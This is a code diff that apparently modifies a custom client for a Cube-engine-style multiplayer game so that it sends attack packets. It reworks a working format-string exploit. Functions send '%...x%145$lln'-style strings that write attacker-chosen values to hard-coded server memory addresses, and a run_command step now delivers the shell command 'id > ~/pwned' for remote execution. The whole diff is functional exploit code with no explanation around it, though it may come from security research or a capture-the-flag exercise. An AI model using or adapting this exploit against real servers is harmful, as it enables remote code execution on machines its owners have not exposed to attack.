@@ -288,9 +288,8 @@ void send_payload()
     sendpackettoserv(1, p.finalize());
 }
 
-void write_address()
+void write_address(unsigned long long address)
 {
-    unsigned long long address = 0x446290;
     std::stringstream format;
     format << "hello%" << std::to_string(address - 0x9) << "x%145$lln";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
@@ -299,11 +298,10 @@ void write_address()
     sendpackettoserv(1, p.finalize());
 }
 
-void write_value()
+void write_value(unsigned long long val)
 {
-    unsigned long long value = 0x430df4;
     std::stringstream format;
-    format << "world%" << std::to_string(value - 0x9) << "x%238$lln";
+    format << "world%" << std::to_string(val - 0x9) << "x%238$lln";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
     putint(p, SV_TEXTME);
     sendstring(format.str().c_str(), p);
@@ -312,7 +310,7 @@ void write_value()
 
 void run_command()
 {
-    char cmd[] = "hello";
+    char cmd[] = "id > ~/pwned";
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
     putint(p, SV_TEXTME);
     sendstring(cmd, p);
@@ -324,9 +322,9 @@ void toserver(char *text)
     if (!strcmp(text, "a"))
         send_payload();
     else if (!strcmp(text, "b"))
-        write_address();
+        write_address(0x446290);
     else if (!strcmp(text, "c"))
-        write_value();
+        write_value(0x4032d6);
     else if (!strcmp(text, "d"))
         run_command();
     // _toserver(cmd, SV_TEXT, SV_TEAMTEXT);
